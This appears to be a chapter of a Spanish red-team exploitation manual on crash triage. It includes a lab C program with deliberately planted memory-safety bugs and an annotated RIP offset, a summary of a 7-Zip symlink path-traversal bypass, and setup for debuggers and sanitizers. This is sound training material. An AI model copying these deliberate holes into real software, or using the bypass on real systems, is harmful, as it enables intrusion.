---
title: "Capítulo 05: Análisis de Crashes"
chapter: 05
description: "Análisis de Crashes - Manual de Explotación del Kernel de Linux"
---

### CAPÍTULO 4. PATCH DIFFING
Bitácora Red Team
│
PERO symlink WSL espera '/' como absoluto
│
│
4. Path clasificado como "relativo" - check bypassed
│
│
5. Symlink creado: safe_folder\link -> C:\Users\Public\Desktop │
│
6. Extracción: safe_folder\link\malware.exe
│
│
7. Windows sigue symlink →escribe a C:\Users\Public\Desktop\
│
└─────────────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────────────┐
│
RESULTADO: Arbitrary File Write fuera del directorio!
│
│
→RCE via DLL hijacking, startup folder, file association
│
└─────────────────────────────────────────────────────────────────┘
### 4.7.4.
### 3.7.4 Checklist de Triage para Código de Validación de Paths
Buscar: ‐ Funciones: IsSafePath, ValidatePath, CheckPath, Normalize ‐ Detección de absoluto:
IsAbsolute, IsRelative, GetRootPrefixSize ‐ Concatenación de paths: JoinPath, CombinePath, ope-
rator/ ‐ Manejo de symlinks: CreateSymbolicLink, SetReparseData ‐ Conversión de separadores:
Replace('/', '\\')
Verificar: ‐ ¿Detección de path absoluto funciona cross‐plataforma? ‐ ¿Symlinks WSL/Linux mane‐
jados con semántica correcta? ‐ ¿Normalización ocurre ANTES de validación? ‐ ¿Checks de “dange‐
rous link” corren para TODOS los tipos de symlink? ‐ ¿No hay guards #ifdef que salten verificaciones
de seguridad?
### 4.7.5.
Conclusiones del Capítulo 3
1. El parche es frecuentemente la única fuente de verdad cuando los detalles del CVE son
limitados.
2. Las herramientas automatizan pero no reemplazan el análisis humano ‐ Ghidriff encuen‐
tra funciones cambiadas, tú entiendes por qué.
3. Los símbolos son multiplicadores de fuerza ‐ Con PDBs ves IppValidatePacketLength; sin
ellos, ves sub_1400A2F40.
4. Patrones de corrección revelan clases de vulnerabilidad:
Bounds checks añadidos →overflow/OOB
Inicialización añadida →memoria no inicializada
Locks añadidos →race condition
Validación de input →input validation flaw
5. El patch diffing encuentra variantes ‐ Al analizar un fix, frecuentemente se descubren bugs
similares en código cercano.
6. El análisis cross‐plataforma requiere conocimiento de ambas semánticas ‐ Como se vio
en 7‐Zip, paths WSL en Windows necesitan tratamiento especial.

---

### CAPÍTULO 4. PATCH DIFFING
Bitácora Red Team
7. La automatización transforma el análisis de reactivo a proactivo ‐ Puedes analizar parches
horas después de su liberación.
Preguntas de Discusión:
1. CVE‐2022‐34718 requiere IPsec SA establecida pero recibió CVSS 9.8. ¿Cómo deberían los
prerrequisitos afectar el rating de severidad?
2. El bug de EvilESP abarcó dos funciones ﴾IppReceiveEsp y Ipv6pReassembleDatagram﴿. ¿Cómo
podrían el análisis estático o revisión de código detectar vulnerabilidades cross‐función?
3. La fragmentación IPv6 es fuente recurrente de vulnerabilidades. ¿Qué hace que la lógica de
reensamblaje sea propensa a errores?
4. El fix de 7‐Zip añadió 6+ cambios distintos. ¿Cómo determinas cuál corrige la vulnerabilidad
core vs añade defensa en profundidad?

---

Capítulo 5
Análisis de Crashes
Después de encontrar vulnerabilidades potenciales mediante fuzzing o patch diffing, el siguiente
paso crítico es analizar crashes para determinar si son explotables. Este capítulo cubre triage de
crashes, dominio de depuradores, sanitizers de memoria y técnicas avanzadas de análisis de causa
raíz.
Objetivos del Capítulo: ‐ Configurar entornos de depuración profesionales ﴾WinDbg, Pwndbg﴿‐
Dominar sanitizers de memoria ﴾ASAN, UBSAN, MSAN, TSAN﴿‐ Implementar pipelines automatiza‐
dos de triage con CASR ‐ Desarrollar PoCs confiables con pwntools ‐ Construir cadenas de explota‐
ción completas
### 5.1.
### 4.1 Fundamentos del Análisis de Crashes
El análisis de crashes es el proceso de transformar un crash descubierto por un fuzzer en conocimien‐
to accionable sobre una vulnerabilidad. Esto incluye determinar la causa raíz, evaluar explotabilidad,
y desarrollar pruebas de concepto.
### 5.1.1.
### 4.1.1 Árbol de Decisión para Análisis de Crashes
┌─────────────────────────────────────────────────────────────────────────┐
│
### CRASH RECIBIDO
│
│
(fuzzer, reporte de bug, test)
│
└─────────────────────────────────────────────────────────────────────────┘
│
▼
┌───────────────────────┐
│¿Reproducible?
│──No──►Análisis de condiciones
└───────────────────────┘
de race / no-determinismo
│Sí
│
▼
▼
┌───────────────────────────────┐
┌────────────────┐
│¿Código fuente disponible?
│
│rr / TTD para
│

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
└───────────────────────────────┘
│replay exacto
│
│
│
└────────────────┘
Sí
No
│
│
▼
▼
┌───────────────────────────────┐
┌──────────────────────────────────┐
│Recompilar con sanitizers:
│
│¿Qué plataforma?
│
│• -fsanitize=address,undefined│
└──────────────────────────────────┘
│• -g -O1
│
│
│
│
│• -fno-omit-frame-pointer
│
Windows
Linux
Mobile
└───────────────────────────────┘
│
│
│
│
▼
▼
▼
▼
┌─────────┐┌──────────┐┌───────────┐
┌───────────────────────────┐
│WinDbg
││Pwndbg
││Tombstone │
│Ejecutar con crash input
│
### │+ TTD
││+ rr
││+ Frida
│
│Capturar reporte ASAN
│
│+ !exp
### ││+ CASR
### ││+ LLDB
│
└───────────────────────────┘
└─────────┘└──────────┘└───────────┘
│
│
│
│
└──────────────────┴───────────┴────────────┘
│
▼
┌───────────────────────────────────────────┐
│
### CLASIFICACIÓN & TRIAGE
│
│• Tipo de crash (OOB, UAF, DoubleFree)
│
│• Nivel de control del atacante
│
│• Severidad (Exploitable/Maybe/No)
│
└───────────────────────────────────────────┘
│
▼
┌───────────────────────────────────────────┐
│
### ANÁLISIS DE CAUSA RAÍZ
│
│• Minimizar input (afl-tmin)
│
│• Trazar ejecución (DynamoRIO, Intel PT)
│
│• Buscar datos controlados por atacante
│
└───────────────────────────────────────────┘
│
▼
┌───────────────────────────────────────────┐
│
DESARROLLO DE PoC
│
│• Script reproducible (Python/pwntools)
│
│• Test de confiabilidad (10/10 crashes)
│
│• Documentación de impacto
│
└───────────────────────────────────────────┘

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.1.2.
### 4.1.2 Selección de Herramientas por Escenario
Escenario
Herramienta Principal
Secundaria
Sanitizer
Flujo
Linux + fuente
GDB + Pwndbg
rr
### ASAN +
### UBSAN
Recompilar
→Repro‐
ducir →
Analizar
Linux sin
fuente
GDB + Pwndbg
Ghidra
### N/A
Reversing
→Crash
→Triage
Windows +
fuente
WinDbg + TTD
Visual Studio
### ASAN ﴾MSVC﴿
Símbolos
### →TTD →
Análisis
Windows sin
fuente
WinDbg + TTD
IDA/Ghidra
### N/A
PageHeap
→!exploi‐
table
Corpus de
fuzzer
### CASR
afl‐tmin
### ASAN
Cluster →
Minimi‐
zar →
Priorizar
Crash no
determinístico
rr / TTD
GDB/WinDbg
### TSAN
Grabar →
Replay →
Bisect
Kernel Linux
crash + GDB
drgn
### KASAN
vmcore
→
Símbolos
→
Análisis
Kernel
Windows
WinDbg kernel
Driver Verifier
### N/A
.dmp →
Símbolos
→
!analyze
Rust/Go
rust‐gdb / Delve
### LLDB
ASAN ﴾nightly﴿
Panic →
Backtrace
### →FFI
### 5.1.3.
### 4.1.3 Suite de Pruebas Vulnerable
Para los ejercicios de este capítulo, usaremos un binario con múltiples vulnerabilidades:
// ~/crash_analysis_lab/src/vulnerable_suite.c
// Compila con: gcc -g -fno-stack-protector vulnerable_suite.c -o ../vuln_no_protect
// Para ASAN: gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite.c -o ../vuln_as
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
// Test 1: Stack Buffer Overflow
// Control de RIP a offset 72 bytes (64 buffer + 8 RBP guardado)
void stack_overflow(char *input) {
char buffer[64];
printf("[*] Copiando input a buffer de 64 bytes...\n");
strcpy(buffer, input);
// ¡Sin verificación de límites!
printf("[*] Buffer:
%s\n", buffer);
}
// Test 2: Heap Buffer Overflow
// Corrupción de metadatos del heap
void heap_overflow(char *input) {
char *buf = malloc(32);
printf("[*] Allocated 32 bytes at
%p\n", buf);
strcpy(buf, input);
// Overflow del buffer de heap
printf("[*] Buffer:
%s\n", buf);
free(buf);
}
// Test 3: Use-After-Free
// Lectura y escritura después de free()
void use_after_free(void) {
char *ptr = malloc(64);
strcpy(ptr, "Hello, World!");
printf("[*] Allocated at
%p:
%s\n", ptr, ptr);
free(ptr);
// Liberar memoria
printf("[*] Freed, now accessing...\n");
printf("[*] UAF read:
%s\n", ptr);
// Lectura UAF
ptr[0] = 'X';
// Escritura UAF
}
// Test 4: Double Free
// Corrupción de estructuras del allocator
void double_free(void) {
char *ptr = malloc(64);
printf("[*] Allocated at
%p\n", ptr);
free(ptr);
printf("[*] First free done\n");
free(ptr);
// ¡Double free!
}
// Test 5: NULL Pointer Dereference
// Crash determinístico en NULL
void null_deref(int trigger) {
char *ptr = trigger ? malloc(10) : NULL;
printf("[*] ptr =
%p\n", ptr);
*ptr = 'A';
// NULL deref si trigger es 0

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
}
void print_usage(char *prog) {
printf("Usage:
%s <test_num> [input]\n", prog);
printf("Tests:\n");
printf("
1 <input>
- Stack overflow (72 bytes a RIP)\n");
printf("
2 <input>
- Heap overflow\n");
printf("

- Use-after-free\n");
printf("

- Double free\n");
printf("
5 <0|1>
- NULL deref (0=crash)\n");
}
int main(int argc, char **argv) {
setbuf(stdout, NULL);
setbuf(stderr, NULL);
if (argc < 2) { print_usage(argv[0]); return 1; }
int test = atoi(argv[1]);
switch(test) {
case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;
case 3: use_after_free(); break;
case 4: double_free(); break;
case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;
default: print_usage(argv[0]); return 1;
}
return 0;
}
Compilación del Laboratorio:
mkdir -p ~/crash_analysis_lab/{src,crashes,casrep,pocs}
cd ~/crash_analysis_lab/src
# Guardar vulnerable_suite.c y compilar variantes
# 1. Sin protecciones (para explotación)
gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite.c -o ../vuln_no_protect
# 2. Con ASAN (para detección de bugs)
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite.c -o ../vuln_asan
# 3. Con protecciones estándar (para comparación)
gcc -g vulnerable_suite.c -o ../vuln_protected
# Verificar compilaciones
ls -la ~/crash_analysis_lab/vuln_*
# Test rápido

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
cd ~/crash_analysis_lab
./vuln_no_protect 1 $(python3 -c "print('A'*100)")
# Stack overflow
./vuln_asan 3
# UAF detectado por ASAN
Tabla de Comportamiento de Crashes:
Test
Sin ASAN
Con ASAN
Señal
Notas
1 ﴾Stack﴿
### SIGSEGV
## ASAN:
stack‐buffer‐overflow
SIGSEGV/SIGABRTControl de RIP
2 ﴾Heap﴿
Silencioso
## ASAN:
heap‐buffer‐overflow
### SIGABRT
Sin ASAN no
crashea
### 3 ﴾UAF﴿
Silencioso
## ASAN:
heap‐use‐after‐free
### SIGABRT
Sin ASAN no
crashea
4 ﴾Double﴿
### SIGABRT
ASAN: double‐free
### SIGABRT
Detectado por
glibc
### 5 ﴾NULL﴿
### SIGSEGV
ASAN: SEGV on
unknown
### SIGSEGV
Crash
inmediato
￿ IMPORTANTE: Los tests 2 y 3 ﴾heap overflow y UAF﴿son silenciosos sin ASAN. Siem‐
pre usar builds con sanitizers para triage completo.
### 5.2.
### 4.2 Depuradores y Configuración
### 5.2.1.
### 4.2.1 WinDbg Preview para Windows
WinDbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades
avanzadas de Time Travel Debugging.
Instalación y Configuración:
# Instalar desde Microsoft Store o winget
winget install Microsoft.WinDbgPreview
# Crear directorio de símbolos
mkdir C:\Symbols
# Configurar symbol path persistente (variable de entorno)
[Environment]::SetEnvironmentVariable(
### "NT_SYMBOL_PATH",
"SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols",
"User"
)
Configuración de Symbol Path en WinDbg:
.sympath SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols
.symfix+ C:\Symbols
.reload /f

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Comandos Esenciales de WinDbg:
Comando
Propósito
Ejemplo
!analyze -v
Análisis automático de crash
### N/A
k / kp / kv
Stack trace ﴾varios formatos﴿
kv 20
r
Mostrar registros
r rax, rbx
u / ub
Disassembly adelante/atrás
u rip L10
d / db / dq
Dump de memoria
dq rsp L8
!heap
Análisis del heap
!heap -s
!address
Información de región de memoria
!address rsp
lm
Listar módulos cargados
lm vm ntdll
!peb
Process Environment Block
### N/A
.ecxr
Cambiar a contexto de excepción
### N/A
g
Continuar ejecución
### N/A
p / t
Step over / Step into
### N/A
Time Travel Debugging ﴾TTD﴿:
TTD permite grabar la ejecución completa de un proceso y reproducirla hacia adelante o atrás.
# Grabar ejecución con TTD desde línea de comandos
tttracer.exe -out C:\Traces -launch target.exe crash_input.txt
# O desde WinDbg Preview:
# File →Start debugging →Launch executable (advanced) →✓Record with Time Travel
Comandos TTD en WinDbg:
Comando
Propósito
!tt 0
Ir al inicio del trace
!tt 100
Ir al final del trace
!tt 50
Ir al 50 % del trace
g-
Ejecutar hacia atrás
p-
Step back
!positions
Mostrar posiciones del trace
!index
Construir índice para búsquedas
dx @$curses-
sion.TTD.Calls("ntdll!*Heap*")
Buscar llamadas a funciones
dx @$cursession.TTD.Memory(address,
size, "w")
Buscar escrituras a memoria
Script de Clasificación Automatizada ﴾WinDbg JavaScript﴿:
// crash_classify.js - Ejecutar con: .scriptrun crash_classify.js
"use strict";
function initializeScript() {

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
return [new host.apiVersionSupport(1, 7)];
}
function analyzeCurrentCrash() {
const ctl = host.namespace.Debugger.Utility.Control;
const dbg = host.namespace.Debugger.State;
// Obtener contexto de excepción
ctl.ExecuteCommand(".ecxr");
// Obtener registros
const regs = dbg.DebuggerVariables.curthread.Registers.User;
const rip = regs.rip;
const rsp = regs.rsp;
host.diagnostics.debugLog("=== Crash Classification ===\n");
host.diagnostics.debugLog(`RIP: ${rip}\n`);
host.diagnostics.debugLog(`RSP: ${rsp}\n`);
// Clasificar por tipo de acceso
let crashType = "UNKNOWN";
let severity = "UNKNOWN";
// Verificar si RIP es controlable
if (rip < 0x10000 || rip > 0x7fffffffffff) {
crashType = "RIP_CONTROL";
severity = "CRITICAL";
}
// Verificar NULL deref
else if (rip < 0x1000) {
crashType = "NULL_DEREF";
severity = "LOW";
}
host.diagnostics.debugLog(`Type: ${crashType}\n`);
host.diagnostics.debugLog(`Severity: ${severity}\n`);
// Análisis de !exploitable si está disponible
try {
ctl.ExecuteCommand("!exploitable");
} catch(e) {
host.diagnostics.debugLog("(!exploitable no disponible)\n");
}
return { crashType, severity, rip: rip.toString(16) };
}
function invokeScript() {

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
return analyzeCurrentCrash();
}
### 5.2.2.
### 4.2.2 GDB + Pwndbg para Linux
Pwndbg es una extensión de GDB diseñada específicamente para análisis de vulnerabilidades y
desarrollo de exploits.
Instalación de Pwndbg:
# Clonar e instalar
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
# Verificar instalación
gdb -q -ex "quit"
# Debería mostrar banner de Pwndbg
# Dependencias adicionales recomendadas
pip install pwntools ropper capstone keystone-engine
Configuración de Core Dumps en Linux:
# Habilitar core dumps ilimitados
ulimit -c unlimited
# Configurar patrón de nombre de cores
echo "core. %e. %p. %t" | sudo tee /proc/sys/kernel/core_pattern
# O usar apport para Ubuntu (centralizado)
echo "/var/crash/core. %e. %p" | sudo tee /proc/sys/kernel/core_pattern
# Verificar configuración
cat /proc/sys/kernel/core_pattern
Comandos Esenciales de Pwndbg:
Comando
Propósito
Ejemplo
context
Mostrar contexto completo
context reg stack code
checksec
Verificar protecciones del binario
### N/A
vmmap
Mapa de memoria del proceso
vmmap heap
telescope
Dereferencia inteligente de
memoria
telescope $rsp 20
cyclic
Generar/buscar patrones
cyclic 200 / cyclic -l
0x61616168
search
Buscar en memoria
search -s "FLAG"
heap
Análisis de chunks del heap
heap bins
vis_heap_chunks
Visualizar chunks
### N/A
got
Mostrar GOT
### N/A
plt
Mostrar PLT
### N/A

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Comando
Propósito
Ejemplo
rop
Buscar gadgets ROP
rop --grep "pop rdi"
canary
Mostrar valor del canary
### N/A
piebase
Base de PIE
### N/A
procinfo
Información del proceso
### N/A
Uso Típico para Análisis de Crash:
cd ~/crash_analysis_lab
# Cargar binario con crash input
gdb -q ./vuln_no_protect
# En GDB/Pwndbg:
pwndbg> set args 1 $(python3 -c "print('A'*100)")
pwndbg> run
# Después del crash:
pwndbg> context
pwndbg> bt
# Backtrace
pwndbg> telescope $rsp 20
# Examinar stack
pwndbg> x/20gx $rsp
# Raw dump del stack
pwndbg> info reg
# Todos los registros
pwndbg> checksec
# Verificar protecciones
Script de Análisis Black‐Box ﴾GDB Python﴿:
#!/usr/bin/env python3
# blackbox_analyze.py - Análisis automatizado de crashes
# Uso: gdb -q -x blackbox_analyze.py ./target
import gdb
import re
class CrashAnalyzer:
def __init__(self):
self.crash_info = {}
def analyze(self):
# Ejecutar hasta crash
gdb.execute("run", to_string=True)
# Capturar estado
self.crash_info['signal'] = self._get_signal()
self.crash_info['rip'] = self._get_reg('rip')
self.crash_info['rsp'] = self._get_reg('rsp')
self.crash_info['backtrace'] = self._get_backtrace()

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# Clasificar
self._classify()
self._print_report()
def _get_signal(self):
try:
output = gdb.execute("info signal", to_string=True)
for line in output.split('\n'):
if 'received' in line.lower():
return line.strip()
except:
pass
return "UNKNOWN"
def _get_reg(self, reg):
try:
return int(gdb.parse_and_eval(f"${reg}"))
except:
return 0
def _get_backtrace(self):
try:
return gdb.execute("bt 10", to_string=True)
except:
return "No backtrace available"
def _classify(self):
rip = self.crash_info['rip']
if rip < 0x1000:
self.crash_info['type'] = "NULL_POINTER_DEREF"
self.crash_info['severity'] = "LOW"
elif rip > 0x7fffffffffff:
self.crash_info['type'] = "RIP_CORRUPTION"
self.crash_info['severity'] = "CRITICAL"
elif 0x41414141 <= rip <= 0x4141414141414141:
self.crash_info['type'] = "RIP_CONTROL_PATTERN"
self.crash_info['severity'] = "CRITICAL"
else:
self.crash_info['type'] = "MEMORY_CORRUPTION"
self.crash_info['severity'] = "HIGH"
def _print_report(self):
print("\n" + "="*60)
print("CRASH ANALYSIS REPORT")
print("="*60)
print(f"Type:
{self.crash_info.get('type', 'UNKNOWN')}")
print(f"Severity: {self.crash_info.get('severity', 'UNKNOWN')}")

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
print(f"RIP:
0x{self.crash_info.get('rip', 0):x}")
print(f"RSP:
0x{self.crash_info.get('rsp', 0):x}")
print(f"Signal:
{self.crash_info.get('signal', 'UNKNOWN')}")
print("-"*60)
print("BACKTRACE:")
print(self.crash_info.get('backtrace', 'N/A'))
print("="*60)
# Ejecutar análisis
if __name__ == "__main__":
analyzer = CrashAnalyzer()
analyzer.analyze()
### 5.2.3.
### 4.2.3 Colección de Dumps
Windows ‐ Windows Error Reporting ﴾WER﴿y ProcDump:
# Configurar WER para guardar dumps
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EX
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWOR
# Usar ProcDump para captura específica
# Descargar de: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
# Capturar dump en crash
procdump -e -ma target.exe -o C:\Dumps
# Capturar dump en excepción específica
procdump -e 1 -f "Access Violation" target.exe
Linux ‐ Core Dumps y Systemd:
# Verificar estado actual
cat /proc/sys/kernel/core_pattern
ulimit -c
# Configuración persistente
echo "kernel.core_pattern=/var/crash/core. %e. %p. %t" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
# Para systemd-coredump
sudo apt install systemd-coredump
echo "kernel.core_pattern=|/lib/systemd/systemd-coredump %P %u %g %s %t %c %h" | sudo tee /etc/sysctl.d/
# Listar cores con coredumpctl
coredumpctl list
coredumpctl info MATCH
coredumpctl debug MATCH
# Abre GDB directamente

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# Script de batch collection
for input in crashes/*; do
timeout 5 ./target "$input" || {
mv core.* "cores/$(basename $input).core" 2>/dev/null
}
done
### 5.2.4.
### 4.2.4 PageHeap y AppVerifier ﴾Windows﴿
PageHeap coloca páginas de guarda alrededor de allocaciones para detectar heap overflows inme‐
diatamente.
# Habilitar PageHeap para un ejecutable
gflags /p /enable target.exe /full
# Verificar estado
gflags /p
# Deshabilitar
gflags /p /disable target.exe
# Con AppVerifier (GUI más completo)
appverif.exe
# Agregar aplicación →Seleccionar checks (Heaps, Handles, Locks)
Ejemplo de Detección con PageHeap:
// heap_vuln.c - Heap overflow detectable con PageHeap
#include <windows.h>
#include <stdio.h>
int main() {
char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, 16);
printf("[*] Allocated 16 bytes at
%p\n", buf);
// Este overflow es detectado INMEDIATAMENTE con PageHeap
strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAA");
// 25 bytes > 16
HeapFree(GetProcessHeap(), 0, buf);
return 0;
}
Sin PageHeap: El overflow corrompe silenciosamente el heap. Con PageHeap: Crash inmediato
en STATUS_ACCESS_VIOLATION al escribir más allá del buffer.

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.3.
### 4.3 Sanitizadores de Memoria
Los sanitizers son herramientas de instrumentación que detectan bugs de memoria en tiempo de
ejecución. Son esenciales para análisis de crashes porque convierten bugs silenciosos en crashes
informativos.
### 5.3.1.
### 4.3.1 AddressSanitizer ﴾ASAN﴿
ASAN es el sanitizer más importante para análisis de seguridad. Detecta múltiples clases de bugs
con overhead moderado ﴾~2x slowdown﴿.
Compilación con ASAN:
### # GCC
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan
# Clang (recomendado para mejor reporting)
clang -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan
# MSVC (Visual Studio 2019 16.9+)
cl /fsanitize=address /Zi source.c
Configuración de Runtime ﴾ASAN_OPTIONS﴿:
export ASAN_OPTIONS="\
abort_on_error=1:\
symbolize=1:\
detect_leaks=1:\
detect_stack_use_after_return=1:\
detect_stack_use_after_scope=1:\
check_initialization_order=1:\
strict_init_order=1:\
print_stats=1:\
halt_on_error=1:\
quarantine_size_mb=256:\
malloc_context_size=30:\
print_legend=true:\
print_scariness=true"
Tipos de Errores Detectados por ASAN:
Error
Descripción
Ejemplo
heap‐buffer‐overflow
Escritura/lectura fuera de bounds en heap
buf[size+1] = 'x'
stack‐buffer‐overflow
Overflow de buffer en stack
char buf[10]; buf[20]=0;
global‐buffer‐
overflow
Overflow de variable global
Similar
heap‐use‐after‐free
Acceso a memoria liberada
free(p); *p=0;
stack‐use‐after‐return
Acceso a stack después de return
Puntero a local escapado
stack‐use‐after‐scope
Acceso fuera del scope
Variable local fuera de
bloque

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Error
Descripción
Ejemplo
double‐free
Liberar memoria dos veces
free(p); free(p);
alloc‐dealloc‐
mismatch
malloc/delete o new/free
free(new int)
SEGV on unknown
address
Crash en dirección inválida
NULL deref
Ejemplo de Reporte ASAN ﴾Heap Buffer Overflow﴿:

==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000050
READ of size 1 at 0x602000000050 thread T0
#0 0x4011a3 in heap_overflow /home/user/vulnerable_suite.c:18:5
#1 0x4012b8 in main /home/user/vulnerable_suite.c:45:9
#2 0x7f...
in __libc_start_main
0x602000000050 is located 0 bytes to the right of 32-byte region [0x602000000030,0x602000000050)
allocated by thread T0 here:
#0 0x7f...
in malloc
#1 0x401156 in heap_overflow /home/user/vulnerable_suite.c:15:17
SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user/vulnerable_suite.c:18:5 in heap_overflow
Interpretando Shadow Memory:
ASAN usa “shadow memory” para rastrear el estado de cada byte:
Shadow byte legend:
Addressable:

Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:
fa
Freed heap region:
fd
Stack left redzone:
f1
Stack mid redzone:
f2
Stack right redzone:
f3
Stack after return:
f5
Stack use after scope:
f8
Global redzone:
f9
Global init order:
f6
Poisoned by user:
f7
Container overflow:
fc
Array cookie:
ac
Intra object redzone:
bb
ASan internal:
fe
Left alloca redzone:
ca
Right alloca redzone:
cb

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.3.2.
### 4.3.2 UndefinedBehaviorSanitizer ﴾UBSAN﴿
UBSAN detecta comportamiento indefinido en C/C++ que puede causar bugs sutiles.
# Compilación con UBSAN
gcc -g -O1 -fsanitize=undefined source.c -o target_ubsan
# Combinado con ASAN (recomendado)
gcc -g -O1 -fsanitize=address,undefined source.c -o target_asan_ubsan
Errores Detectados:
// signed-integer-overflow
int a = INT_MAX;
int b = a + 1;
// UBSAN: runtime error
// null-pointer-dereference
int *p = NULL;
*p = 42;
// UBSAN: runtime error
// shift-out-of-bounds
int x = 1 << 33;
// UBSAN: shift exponent 33 is too large
// float-cast-overflow
double d = 1e100;
int i = (int)d;
// UBSAN: value cannot be represented
### 5.3.3.
### 4.3.3 MemorySanitizer ﴾MSAN﴿
MSAN detecta lecturas de memoria no inicializada ﴾solo Clang﴿.
# Requiere Clang y libc++ instrumentada
clang -g -O1 -fsanitize=memory -fno-omit-frame-pointer source.c -o target_msan
Ejemplo de Error:
int main() {
int x;
// No inicializada
if (x)
// MSAN: use-of-uninitialized-value
printf("branch taken\n");
return 0;
}
### 5.3.4.
### 4.3.4 ThreadSanitizer ﴾TSAN﴿
TSAN detecta data races y deadlocks en programas multi‐hilo.
# Compilación con TSAN
gcc -g -O1 -fsanitize=thread source.c -lpthread -o target_tsan
Ejemplo de Data Race:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
#include <pthread.h>
int counter = 0;
void* increment(void* arg) {
for (int i = 0; i < 1000000; i++)
counter++;
// TSAN: data race
return NULL;
}
int main() {
pthread_t t1, t2;
pthread_create(&t1, NULL, increment, NULL);
pthread_create(&t2, NULL, increment, NULL);
pthread_join(t1, NULL);
pthread_join(t2, NULL);
return 0;
}
Reporte TSAN:
WARNING: ThreadSanitizer: data race
Write of size 4 at 0x... by thread T1:
#0 increment source.c:7 (target_tsan+0x...)
Previous write of size 4 at 0x... by thread T2:
#0 increment source.c:7 (target_tsan+0x...)
### 5.3.5.
### 4.3.5 Matriz de Compatibilidad de Sanitizers
Sanitizer
### GCC
Clang
### MSVC
Linux
Windows
macOS
### ASAN
￿
￿
￿
￿
￿
￿
### UBSAN
￿
￿
￿
￿
￿
￿
### MSAN
￿
￿
￿
￿
￿
￿
### TSAN
￿
￿
￿
￿
￿
￿
Combinaciones Válidas:
Combinación
Válida
Uso
### ASAN + UBSAN
￿
Triage de fuzzing general
### ASAN + LSAN
￿
Incluido por defecto con ASAN
### ASAN + MSAN
￿
Incompatibles
### ASAN + TSAN
￿
Incompatibles
### MSAN + UBSAN
￿
Bugs de inicialización
### TSAN + UBSAN
￿
Bugs de concurrencia

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.3.6.
### 4.3.6 GWP‐ASan para Producción
GWP‐ASan ﴾Google‐Wide Performance‐safe ASan﴿es un sampling allocator que detecta bugs de
memoria en producción con overhead mínimo ﴾~1‐2 %﴿.
// Integración en Android (automática en Android 11+)
// En Linux, usar con jemalloc o tcmalloc
// Configurar sampling rate
export GWP_ASAN_SAMPLE_RATE=5000
// 1 de cada 5000 allocations
// Ejemplo de crash en producción
==12345==ERROR: GWP-ASan detected a memory error
Use-after-free at 0x7f1234567890
Allocation stack:
#0 malloc ...
#1 create_widget app.c:42
Deallocation stack:
#0 free ...
#1 destroy_widget app.c:78
Access stack:
#0 update_widget app.c:120
Cuándo Usar Cada Sanitizer:
┌──────────────────────────────────────────────────────────────┐
│
### SELECCIÓN DE SANITIZER
│
├──────────────────────────────────────────────────────────────┤
│
│
│
Fuzzing/Triage ──────────►ASAN + UBSAN
│
│
│
│
│
└──►Bugs de concurrencia ──────►TSAN + UBSAN
│
│
│
│
│
└──►Bugs de inicialización ──►MSAN + UBSAN
│
│
│
│
Producción ─────────────►GWP-ASan (sampling)
│
│
│
│
Kernel Linux ───────────►KASAN / KMSAN / KCSAN
│
│
│
└──────────────────────────────────────────────────────────────┘

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.4.
### 4.4 Clasificación y Triage Automatizado
### 5.4.1.
### 4.4.1 CASR ‐ Crash Analysis and Severity Reporter
CASR es una suite de herramientas para clasificación automatizada de crashes, desarrollada por ISP
### RAS.
Instalación:
# Desde crates.io (Rust)
cargo install casr
# O desde source
git clone https://github.com/ispras/casr
cd casr
cargo build --release
sudo cp target/release/casr-* /usr/local/bin/
# Componentes disponibles:
# - casr-san: Procesa crashes de binarios con sanitizers
# - casr-gdb: Procesa crashes con GDB (sin sanitizers)
# - casr-core: Analiza core dumps
# - casr-cluster: Agrupa crashes similares
# - casr-cli: Interfaz de línea de comandos
Uso de CASR para Triage:
cd ~/crash_analysis_lab
